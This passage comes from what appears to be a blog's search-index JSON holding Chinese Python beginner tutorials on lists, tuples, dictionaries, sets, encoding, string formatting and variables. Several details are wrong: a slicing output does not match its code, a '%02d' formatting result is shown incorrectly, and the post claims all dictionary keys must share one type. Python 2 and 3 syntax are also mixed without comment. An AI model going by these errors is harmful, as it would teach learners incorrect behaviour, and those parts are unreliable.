(\"list2[:4]: \", list2[1:])    //前者输出从第1个元素到索引为（4-1）的元素\n                                    //后者输出索引为1到最后一个元素\n\n运行结果：\nchemistry 1997 \nlist1[0]:  physics \nlist2[1:5]:  [2, 3, 4, 5] \nlist2[:4]:  [2, 3, 4, 5, 6, 7] \n\n\n\n三. 更新列表3.1 处理元素附加参考：[列表使用大全] [Python3列表元素的修改] \n\n1. 按索引来使用的方法\n\nappend(‘String’)： 将元素string追加到列表末尾，即把一个元素添加到堆栈顶；\npop(X)： 删除列表中任何位置的元素，只需在括号中指定要删除的元素的索引即可。若果不指定则默认删除末尾的元素；\ninsert(X, “String”)： 将元素String插入到索引为X的位置，原来元素从索引为X往后移；\ndel list[X]： 删除列表list索引为X的元素；\nlen(list)： 是个函数，统计列表list元素的个数，和在字符串中使用一样；\ndel和pop()的区别在于：del删除的元素不可以再继续使用了，但是pop()有个返回值，因为当作栈使用，它删除的元素还可以在其他地方继续使用；\nreverse() ： 按元素顺序倒转；\nsort() ： 是方法，对列表进行永久性排序，前提是列表中所有元素数据类型一样；\nsorted() ： 注意这是个函数，对列表进行临时排序，若列表中所有元素数据类型不一样会报错；\n\n\n\n2. 按值来使用的方法\n\nremove(“String”)： 删除列表中值为String的元素。注意：方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。\n\n\n\n下面示例代码（注意“//”不代表注释，仅仅为了展示）：\nlist1 = ['physics', 'chemistry', 1997, 2000]\nlist2 = [1, 2, 3, 4, 5, 6, 7 ]\n\nlist1.append('Adam')      //append()\nprint(list1)\n\na = list2.pop(3)          //pop()\nprint(a)\n\ndel list2[4]              //del\nprint(list2)\n\nlist2.insert(3,9)         //insert()\nprint(list2)\n\nprint(len(list2))         //len()\n\nlist1.remove(1997)        //remove\nlist1.remove(\"Adam\")\nprint(list1)\n\n运行结果：\n['physics', 'chemistry', 1997, 2000, 'Adam'] \n4 \n[1, 2, 3, 5, 7] \n[1, 2, 3, 9, 5, 7] \n6 \n['physics', 'chemistry', 2000] \n\np = ['asp', 'php']\ns = ['python', 'java','scheme']\n\nprint(s)                        //临时排序\nprint(sorted(s))\nprint(s);print('\\n')\n\ns.sort();print(s);print('\\n')   //永久排序 \n\ns.reverse();print(s)            //倒序\n\n\n运行结果：\n['python', 'java', 'scheme'] \n['java', 'python', 'scheme'] \n['python', 'java', 'scheme'] \n\n\n['java', 'python', 'scheme'] \n\n\n['scheme', 'python', 'java'] \n\n\n\n3.2 嵌套使用列表\ns = ['python', 'java', ['asp', 'php'], 'scheme']\nprint(len(s))\n\n运行结果：\n4 \n\n\n要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了。要拿到’php’可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。\np = ['asp', 'php']\ns = ['python', 'java', p, 'scheme']\nprint(s)\nprint(p[1])\nprint(s[2][1])\n\n运行结果：\n['python', 'java', ['asp', 'php'], 'scheme'] \nphp \nphp \n\n\n\n四. 列表常用的方法和函数4.1 列表操作符列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。如下所示：\n\n\n\nPython表达式\n结果\n描述\n\n\n\n\nlen([1, 2, 3])\n3\n长度\n\n\n[1, 2, 3] + [4, 5, 6]\n[1, 2, 3, 4, 5, 6]\n组合\n\n\n[‘Hi!’] * 4\n[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]\n重复\n\n\n3 in [1, 2, 3]\nTrue\n元素是否存在于列表中\n\n\nfor x in [1, 2, 3]: print x,\n1 2 3\n迭代\n\n\n\n\n\n4.2 列表函数&amp;方法可查阅：[Python列表函数&amp;方法]\n列表中Python包含以下函数:\n\n\n\n序号\n函数\n\n\n\n\n1\ncmp(list1, list2)比较两个列表的元素\n\n\n2\nlen(list)列表元素个数\n\n\n3\nmax(list)返回列表元素最大值\n\n\n4\nmin(list)返回列表元素最小值\n\n\n5\nlist(seq)将元组转换为列表\n\n\n\n\nPython包含以下方法:\n\n\n\n序号\n方法\n\n\n\n\n1\nlist.append(obj)在列表末尾添加新的对象\n\n\n2\nlist.count(obj)统计某个元素在列表中出现的次数\n\n\n3\nlist.extend(seq)在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）\n\n\n4\nlist.index(obj)从列表中找出某个值第一个匹配项的索引位置\n\n\n5\nlist.insert(index, obj)将对象插入列表\n\n\n6\nlist.pop([index=-1])移除列表中的一个元素（默认最后一个元素），并且返回该元素的值\n\n\n7\nlist.remove(obj)移除列表中某个值的第一个匹配项\n\n\n8\nlist.reverse()反向列表中元素\n\n\n9\nlist.sort(cmp=None, key=None, reverse=False)对原列表进行排序\n\n\n\n\n\n五. 元组\n什么是元组tuple：\n\nPython的元组与列表类似，不同之处在于元组的元素不能修改。\n元组使用小括号()，列表使用方括号[]。\n元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。\n当括号中只有一个数字没有逗号时，既表示一个数字也可以便是一个元组，又可以表示数学公式中的小括号，这就产生了歧义。这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时必须加一个逗号。\n\n\n\n一、定义元组\n\ntup1 = ('physics', 'chemistry', 1997, 2000)\ntup2 = (1, 2, 3, 4, 5 )\ntup3 = \"a\", \"b\", \"c\", \"d\"\n\n\n创建空元组：tup1 = ()\n元组中只包含一个元素时，需要在元素后面添加逗号。tup1 = (50,)\n元组与字符串类似，下标索引从0开始，可以进行截取，组合等。\n\n二、使用元组\n\n\n元组可以使用下标索引来访问元组中的值，如下：\n\n#!/usr/bin/python\n\ntup1 = ('physics', 'chemistry', 1997, 2000)\ntup2 = (1, 2, 3, 4, 5, 6, 7 )\n\nprint \"tup1[0]: \", tup1[0]\nprint \"tup2[1:5]: \", tup2[1:5]\n\n以上实例输出结果：\n\ntup1[0]:  physics\ntup2[1:5]:  (2, 3, 4, 5)\n\n\n元组的值不允许修改，但是可以进行运算，比如连接用加号（+），重复用星号（*）。\n\n元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组\n\n\n#!/usr/bin/python\n\ntup = ('physics', 'chemistry', 1997, 2000)\n\nprint tup\ndel tup\nprint \"After deleting tup : \"\nprint tup\n\n以上实例元组被删除后，输出变量会有异常信息，输出如下所示：\n('physics', 'chemistry', 1997, 2000)\nAfter deleting tup :\nTraceback (most recent call last):\n  File \"test.py\", line 9, in &lt;module>\n    print tup\nNameError: name 'tup' is not defined\n\n\n\n最后来看一个“可变的”tuple：\n\n\n\nt = ('a', 'b', ['A', 'B'])\nt[2][0] = 'X'\nt[2][1] = 'Y'\nprint(t)\n\n运行结果：\n('a', 'b', ['X', 'Y']) \n\n这个tuple定义的时候有3个元素，分别是’a’，’b’和一个list。不是说tuple一旦定义后就不可变了吗？怎么后来又变了？别急，我们先看看定义的时候tuple包含的3个元素：\n\n当我们把list的元素’A’和’B’修改为’X’和’Y’后，tuple变为：\n\n\n表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向’a’，就不能改成指向’b’，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！\n理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。\n\n三、元组运算符\n\n与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。\n\n\n\nPython表达式\n结果\n描述\n\n\n\n\nlen((1, 2, 3))\n3\n计算元素个数\n\n\n(1, 2, 3) + (4, 5, 6)\n(1, 2, 3, 4, 5, 6)\n连接\n\n\n(‘Hi!’,) * 4\n(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)\n复制\n\n\n3 in (1, 2, 3)\nTrue\n元素是否存在\n\n\nfor x in (1, 2, 3): print x,\n1 2 3\n迭代\n\n\n\n\n四、元组内置函数\n\nPython元组包含了以下内置函数\n\n\n\n序号\n函数\n\n\n\n\n1\ncmp(tuple1, tuple2)比较两个元组元素。\n\n\n2\nlen(tuple)计算元组元素个数。\n\n\n3\nmax(tuple)返回元组中元素最大值。\n\n\n4\nmin(tuple)返回元组中元素最小值。\n\n\n5\ntuple(seq)将列表转换为元组。\n\n\n\n\n\n六. 字典6.1 字典的定义\n关于字典dict：\n\n字典是另一种可变容器模型，且可存储任意类型对象；\n字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中；d = {key1 : value1, key2 : value2 }\n键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一；\n值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组；\n第一个键定义为什么数据类型，后面所有的键必须定义为相同的数据类型；\n访问字典里的值，把相应的键放入熟悉的方括弧即可，dict[key]\n\n\n\n6.2 字典的修改向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对\n一、添加键—值对、修改字典字典是一种动态结构，可随时在其中添加键—值对。要添加键—值对，可依次指定字典名、用方括号括起的键和相关联的值。如下示例，我们先建立一个空字典，然后向里面添加元素（键值对）并修改：\n\na={}\na['color']='green'\na['points']=5\nprint(a['color'],a['points'])\n\na['color']=666\nprint(a['color'],a['points'])\n\n运行结果：\ngreen 5\n666 5\n\n\n二、删除键—值对\n\n能删单一的元素也能清空字典，清空只需一项操作。\n\n删除字典可以使用del或者pop()。\n\n要删除一个key:\n用pop(key)方法，对应的value也会从dict中删除\n可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。del dict[&#39;key&#39;]\n\n\n删除整个字典：del dict 则dict这个字典被删除了\n\n\n\n# -*- coding: UTF-8 -*-\n\ndict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'}\n\ndel dict['Name']  # 删除键是'Name'的条目\ndict.pop('Class')\n\nprint(dict['Age'])\ndict.clear()      # 清空词典所有条目\ndel dict          # 删除词典\nprint(dict['Age'])\n\n运行结果：\n7\nTraceback (most recent call last):\n  File \"1.py\", line 11, in &lt;module>\n    print(dict['Age'])\nTypeError: 'type' object is not subscriptable\n\n\n6.3 字典的遍历一、判断字典中某个键是否存在\n\n\n方法：\n\n通过in判断key是否存在；\n通过dict提供的get()方法，如果key不存在，可以返回None，或者返回自己指定的value。\n\n\n\n# -*- coding: UTF-8 -*-\n\ndict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'}\na = 'Name' in dict\nb = 'Year' in dict\nprint(a)\nprint(b)\n\nc = dict.get('Name','如果不存在，这里是返回信息')\nd = dict.get('Year','如果不存在，这里是返回信息')\nprint(c)\nprint(d)\n\n运行结果：\nTrue\nFalse\nZara\n如果不存在，这里是返回信息\n\n\n二、遍历字典中的所有键\n\n在不需要使用字典中的值时，方法keys() 很有用。\nf = {\n      'jen': 'python',\n      'sarah': 'c',\n      'edward': 'ruby',\n      'phil': 'python',\n      }  \n\nfor name in f.keys():\n      print(name.title())\n\n运行结果：\nJen\nSarah\nEdward\nPhil\n\n\n三、遍历字典中的所有值\n\n如果你感兴趣的主要是字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。\nf = {\n    'jen': 'python',\n    'sarah': 'c',\n    'edward': 'ruby',\n    'phil': 'python',\n    }\n\nfor g in f.values():\n    print(g.title())\n\n运行结果：\nPython\nC\nRuby\nPython\n\n\n6.4 字典的各种嵌套请自行查阅Python编程：从入门到实践 6.4\n\n6.5 字典内置函数&amp;方法可查阅：[Python字典函数&amp;方法]\n\n一、Python字典包含了以下内置函数：\n\n\n\n\n序号\n函数\n\n\n\n\n1\ncmp(dict1, dict2)比较两个字典元素。\n\n\n2\nlen(dict)计算字典元素个数，即键的总数。\n\n\n3\nstr(dict)输出字典可打印的字符串表示。\n\n\n4\ntype(variable)返回输入的变量类型，如果变量是字典就返回字典类型。\n\n\n\n\n二、Python字典包含了以下内置方法：\n\n\n\n\n\n序号\n方法\n\n\n\n\n1\ndict.clear()删除字典内所有元素\n\n\n2\ndict.copy()返回一个字典的浅复制\n\n\n3\ndict.fromkeys(seq[, val])创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值\n\n\n4\ndict.get(key, default=None)返回指定键的值，如果值不在字典中返回default值\n\n\n5\ndict.has_key(key)如果键在字典dict里返回true，否则返回false\n\n\n6\ndict.items()以列表返回可遍历的(键, 值) 元组数组\n\n\n7\ndict.keys()以列表返回一个字典所有的键\n\n\n8\ndict.setdefault(key, default=None)和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default\n\n\n9\ndict.update(dict2)把字典dict2的键/值对更新到dict里\n\n\n10\ndict.values()以列表返回字典中的所有值\n\n\n11\npop(key[,default])删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。\n\n\n12\npopitem()随机返回并删除字典中的一对键和值。\n\n\n\n\n\n七. 集合\n集合是什么：\n\n集合和字典类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在集合中，没有重复的key；\n集合可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集，差等操作；\n基本功能包括关系测试和消除重复元素。集合对象还支持 union（联合），intersection（交），difference（差）和 sysmmetric difference（对称差集）等数学运算；\n大括号或 set() 函数可以用来创建集合。注意：想要创建空集合，你必须使用 set() 而不是 {}。后者用于创建空字典。\n注意：set()只能放一个参数，它会将里面的字符串拆成字符，并且每个字符都是无序的（集合的属性）；\n如果集合中包含多喝不可拆的元素，则必须用{}来定义集合。\n\n\n\n仔细分析如下代码：\nbasket = {\n    'apple', \n    'orange', \n    'apple', \n    'pear', \n    'orange', \n    'banana'}\n\nprint(basket)\nprint('\\n') \n\na = set('abracadabra')\nb = set('alacazam')\nc =set('我们')\n\nprint(a) \nprint(b)\nprint(c)\n\nprint('\\n') \n\nprint(a - b) \nprint(a | b) \nprint(a &amp; b) \nprint(a ^ b ) \n\n运行结果：\n{'pear', 'orange', 'banana', 'apple'}\n\n\n{'c', 'b', 'r', 'a', 'd'}\n{'c', 'a', 'm', 'z', 'l'}\n{'们', '我'}\n\n\n{'r', 'd', 'b'}\n{'c', 'b', 'r', 'a', 'm', 'd', 'z', 'l'}\n{'a', 'c'}\n{'m', 'b', 'd', 'z', 'l', 'r'}\n\n","thumbnail":"https://i.loli.net/2019/02/28/5c775a3eba5a9.jpg","plink":"https://Directoree.github.io/post/Python-list-tuple-dict-set/"},{"title":"Python-字符编码&字符串&格式化","date":"2019-02-27T17:15:48.000Z","updated":"2019-02-28T03:38:54.922Z","content":"字符编码、字符串(๑°⌓︎°๑)\n\n\nPython-字符编码、字符串、格式化 \n\n\n\n一. 字符编码\n我们已经讲过了，字符串也是一种数据类型，但是，字符串比较特殊的是还有一个编码问题。\n\n因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。最早的计算机在设计时采用8个比特（8 bit）作为一个字节（1 byte）。\n\n所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255）；\n如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，4个字节可以表示的最大整数是4294967295。\n\n\n由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码，比如大写字母A的编码是65，小写字母z的编码是122。\n\n但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了GB2312编码，用来把中文编进去。\n\n你可以想得到的是，全世界有上百种语言，日本把日文编到Shift_JIS里，韩国把韩文编到Euc-kr里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。\n\n因此，Unicode应运而生。Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了。\n\nUnicode标准也在不断发展，但最常用的是用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。\n现在，捋一捋ASCII编码和Unicode编码的区别：ASCII编码是1个字节，而Unicode编码通常是2个字节。\n\n字母A用ASCII编码是十进制的65，二进制的01000001；\n字符0用ASCII编码是十进制的48，二进制的00110000，注意字符’0’(‘零’)和整数0(零)是不同的；\n汉字中已经超出了ASCII编码的范围，用Unicode编码是十进制的20013，二进制的01001110 00101101。\n你可以猜测，如果把ASCII编码的A用Unicode编码，只需要在前面补0(零)就可以，因此，A的Unicode编码是00000000 01000001。\n\n\n新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。\n\n所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：\n\n\n\n\n\n\n\n字符\nASCII\nUnicode\nUTF-8\n\n\nA\n1000001\n00000000 01000001\n01000001\n\n\n中\nx\n01001110 00101101\n11100100 10111000 10101101\n\n\n\n\n\n从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。\n\n\n总结一下现在计算机系统通用的字符编码工作方式：\n\n在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。\n举例：用记事本编辑(计算机内存中)的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8(保存到文件硬盘或者需要传输)\n\n\nPS：所以你看到很多网页的源码上会有类似&lt;meta charset=&quot;UTF-8&quot; /&gt;的信息，表示该网页正是用的UTF-8编码。\n\n\n二. 代码编码和文件编码的设置\nPython中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。解决方法为只要在文件开头加入# -*- coding: UTF-8 -*- 或者 #coding=utf-8 就行了（注意：#coding=utf-8 的 = 号两边不要空格。）\n\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n\nprint \"你好，世界\";\n\n运行结果：\n你好，世界\n\n\n注意：\n\nPython3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。\n注意：如果你使用编辑器，同时需要设置 py 文件存储的格式为 UTF-8\n\n\n\n\n三. 字符与编码的转换在最新的Python 3版本中，字符串是以Unicode编码的，也就是说，Python的字符串支持多语言（字符串可以写任意国家文字）。\n\n3.1 字符与十进制编码的转换\n使用函数：\n\nord()：将字符转换成其对应的整数（十进制），注意不是字符串；\nchr()：将十进制整数转换成其对应的字符。\n\n\na=ord('A')\nb=chr(120)\nprint(a)\nprint(b)\n\n运行结果：\n65 \nx \n\n\n3.2 不同编码之间的转换由于Python的字符串类型是str，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把str变为以字节为单位的bytes。\nPython对bytes类型的数据用带b前缀的单引号或双引号表示：\nx = b'ABC'\nprint(x)\n\n运行结果：\nb'ABC' \n\n\n结论：要注意区分’ABC’和b’ABC’，前者是str，后者虽然内容显示得和前者一样，但bytes的每个字符都只占用一个字节。\n\n\n不同编码之间的转换使用函数：\n\n\ndecode()： 解码，将其他编码的字符串解码成unicode编码；\nencode()： 转码，将unicode编码的字符串转码成其他编码。\ndecode(“utf-8”, errors=”ignore”) ： 忽略其中有异常的编码，仅显示有效的编码；\ndecode(“utf-8”, errors=”replace”)： 替换其中异常的编码，这个相对来可能一眼就知道那些字符编码出问题了；\nlen()： 计算的是str的字符数，如果换成bytes，len()函数就计算字节数。\n\n\n资料查阅：[Python中的编码（encode）与解码（decode）程]\n\n字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。\n\n举例1：以Unicode表示的str通过encode()方法可以编码为指定的bytes\nprint('ABC'.encode('utf-8'))\nprint('中文'.encode('utf-8'))\nprint('中文'.encode('ascii'))\n\n运行结果：\nb'ABC' \nb'\\xe4\\xb8\\xad\\xe6\\x96\\x87' \nTraceback (most recent call last): \n  File \"C:\\Users\\Alvin\\AppData\\Local\\Temp\\learn_python_q5t__kzk_py\\test_21.py\", line 4, in &lt;module> \n    print('中文'.encode('ascii')) \nUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128) \n\n\n\n第三个输出报错是因为含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。\n\n\n举例2：以Unicode表示的str通过encode()方法可以编码为指定的bytes    \nprint(b'ABC'.decode('ascii'))\nprint(b'\\xe4\\xb8\\xad\\xe6\\x96\\x87'.decode('utf-8'))\nprint(b'\\xe4\\xb8\\xad\\xff'.decode('utf-8'))\n\n运行结果：\nABC \n中文 \nTraceback (most recent call last): \n  File \"C:\\Users\\Alvin\\AppData\\Local\\Temp\\learn_python_q5t__kzk_py\\test_22.py\", line 4, in &lt;module> \n    print(b'\\xe4\\xb8\\xad\\xff'.decode('utf-8')) \nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 3: invalid start byte \n\n\n第三个输出报错是因为bytes中包含无法解码的字节，decode()方法会报错。\n\n\n举例3：如果bytes中只有一小部分无效的字节，可以传入errors=&#39;ignore&#39;忽略错误的字节\nprint(b'\\xe4\\xb8\\xad'.decode('utf-8'))\nprint('中'.encode())\nprint(b'\\xe4\\xb8\\xad\\xff'.decode('utf-8', errors='ignore'))\n\n运行结果：\n中 \nb'\\xe4\\xb8\\xad' \n中 \n\n\n举例4：len()函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数\nprint(len('ABC'))\nprint(len('中文'))\nprint(len(b'ABC'))\nprint(len('中文'.encode('utf-8')))\n\n运行结果：\n3 \n2 \n3 \n6 \n\n\n\n\n可见，1个中文字符经过UTF-8编码后通常会占用3个字节，而1个英文字符只占用1个字节。\n在操作字符串时，我们经常遇到str和bytes的互相转换。为了避免乱码问题，应当始终坚持使用UTF-8编码对str和bytes进行转换。\n\n\n\n\n四. 格式化\n重要总结：\n\n一个常见的问题是如何输出格式化的字符串。\n我们经常会输出类似”亲爱的xxx你好！你xx月的话费是xx，余额是xx“之类的字符串，而xxx的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。\n\n\n在Python中，采用的格式化方式和C语言是一致的，用%实现。\n%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。\n格式化整数还可以指定是否补0和整数；浮点数可以指定小数的位数。\n要输出%，用%对其进行转义，即用%%来表示一个%。\n另一种格式化字符串的方法是使用字符串的format()方法，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多\n\n\n\n常见的占位符有：\n\n\n\n占位符\n替换内容\n\n\n\n\n%d\n整数\n\n\n%f\n浮点数\n\n\n%s\n字符串\n\n\n%x\n十六进制整数\n\n\n\n\n示例代码：（里面的“//”并不代表注释符）\na = 'Hello, %s' % 'world'    // 替换一个不使用括号\nb = 'Hi, %s, you have $%d.' % ('Michael', 1000000)   // 替换多个使用括号\n\n\nc = '%6d-%02d' % (3, 1)  //  %6d  表示输出3之前有（6-1）个空格输出\n                         //  %05d 表示输出1之前有（5-1）个0输出\nd = '%.2f' % 3.145926    //  %.2f 表示输出的浮点数保留两位小数，第三位小数>=5就向前进1\ne = 'growth rate: %d %%' % 7   //  转义，用%%表示一个%输出\nf='Hello, {0}, 成绩提升了 {1:.1f}%'.format('小明', 17.125)\n                         //  使用字符串format()方法，注意括号里面的1的意义\n\nprint(a)\nprint(b)\nprint(c)\nprint(d)\nprint(e)\nprint(f)\n\n运行结果：\nHello, world \nHi, Michael, you have $1000000. \n     3-000000001 \n3.15\ngrowth rate: 7 % \nHello, 小明, 成绩提升了 17.1% \n\n\n","thumbnail":"https://i.loli.net/2019/02/28/5c77487f0d3ef.jpg","plink":"https://Directoree.github.io/post/Python-Coding/"},{"title":"Python-变量和数据类型","date":"2019-02-27T12:00:39.000Z","updated":"2019-03-05T16:42:48.388Z","content":"定义一个变量就是定义了一个指针！  ٩(ˊᗜˋ*)و字符串内容很多，就很烦(っ ̯ -｡)\n\n\n变量和数据类型 \n\n\n\n一. 变量一、关于变量\n\n\n\n变量存储在内存中的值。这就意味着在创建变量时会在内存中开辟一个空间。\n基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。\nPython 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。\n在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。\n\n\n\n\n二、变量的赋值\n\n\n\n\nPython 中的变量赋值不需要类型声明。\n每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。\n每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。\n变量的赋值分为：单个变量赋值和多个变量赋值 \n\n\n\n\n单个变量赋值：使用等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。例如：\n\nmessage = \"Hello Python world!\"\nprint(message)\n\n\n我们添加了一个名为message的变量。每个变量都存储了一个值——与变量相关联的信息。在这里，存储的值为文本“Hello Python world!”。\n\n\n多个变量赋值：\n\na = b = c = 1\n#以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。\n\n或者\n\n\na, b, c = 1, 2, \"john\"\n#以上实例，两个整型对象 1 和 2 分别分配给变量 a 和 b，字符串对象 \"john\" 分配给变量 c。\n\n&emsp;\n三、变量的命名和使用\n\n\n\n请务必牢记下述有关变量的规则：1. 变量名只能包含字母、数字和下划线。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。 2. 变量名不能包含空格，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。3. 不要将Python关键字和函数名用作变量名，即不要使用Python保留用于特殊用途的单词，如print。4. 变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。5. 慎用小写字母l和大写字母O，因为它们可能被人错看成数字1和0。6. 注意：就目前而言，应使用小写的Python变量名。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意。\n\n&emsp;\n四、变量是一种动态语言&emsp;代码示例：\n\n# -*- coding: utf-8 -*-\na = 123 # a是整数\nprint(a)\na = 'ABC' # a变为字符串\nprint(a)\n\n运行结果：\n123 \nABC\n\n&emsp;\n这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。和静态语言相比，动态语言更灵活，就是这个原因。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（// 表示注释）：\n\nint a = 123; // a是整数类型变量\na = \"ABC\"; // 错误：不能把字符串赋给整型变量\n\n&emsp;\n五、Python的变量是Python的指针 \n\n可参考：[一切都是对象，一切都是指针，一切都是东西（python的编程哲学）]&emsp;如下代码：\na=5\na=5\nprint(id(a))\nprint(id(5))\n\n运行输出：\n1769134320 \n1769134320 \n\n&emsp;\n我们分别查一下他们的内存地址，发现地址是一样的。\n\n\n于是我们可以这样理解：1. python把一切数据，一切的一切都看作对象，在python中，没有变量，只有指针，要说变量，也是指针变量。2. 这样的变量还有如：列表，字典的值。3. 但是字符串，数字等类型的变量，字典的键就是传值使用，不是指针，而是不可再改变的值。\n\n&emsp;举例子\n例子1：当我们写：\n\n\na = 'ABC'\n\n时，Python解释器干了两件事情：\n\n\n\n在内存中创建了一个’ABC’的字符串；\n在内存中创建了一个名为a的变量，并把它指向’ABC’\n\n\n\n&emsp;\n例子2：\n\n# -*- coding: utf-8 -*-\na = 'ABC'\nb = a\na = 'XYZ'\nprint(b)\n\n运行结果：\nABC \n\n\n最后一行打印出变量b的内容到底是&#39;ABC&#39;呢还是&#39;XYZ&#39;？如果从数学意义上理解，就会错误地得出b和a相同，也应该是&#39;XYZ&#39;，但实际上b的值是&#39;ABC&#39;，让我们一行一行地执行代码，就可以看到到底发生了什么事：1. 执行a = ‘ABC’，解释器创建了字符串’ABC’和变量a，并把a指向’ABC’：\n\n\n\n执行b = a，解释器创建了变量b，并把b指向a指向的字符串’ABC’：\n\n\n\n\n\n执行a = ‘XYZ’，解释器创建了字符串’XYZ’，并把a的指向改为’XYZ’，但b并没有更改：\n\n\n\n\n所以，最后打印变量b的结果自然是’ABC’了。\n\n\n&emsp;\n二. 常量所谓常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，通常用全部大写的变量名表示常量：\n\nPI = 3.14159265359\n\n但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量PI的值，也没人能拦住你。\n\n\n\n\n三. 数据类型标准数据类型在内存中存储的数据可以有多种类型。Python 定义了一些标准类型，用于存储各种类型的数据。\n\n\n\nPython有五个标准的数据类型：1. Numbers（数字）2. String（字符串）3. List（列表）4. Tuple（元组）5. Dictionary（字典）\n\n3.1 数字运算和函数一、整数的定义和基础知识 \n\n\nPython可以处理任意大小的整数，当然包括负整数，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。\n\n计算机由于使用二进制，所以，有时候用十六进制表示整数比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。\n\n\n\n\n二、整数运算 \n\n在Python中，可对整数执行加（+）减（-）乘（*）除（/）平方（**）取余（%）运算。\n\n\n注意事项： \n\n\n\nPython使用两个乘号表示乘方运算：3 ** 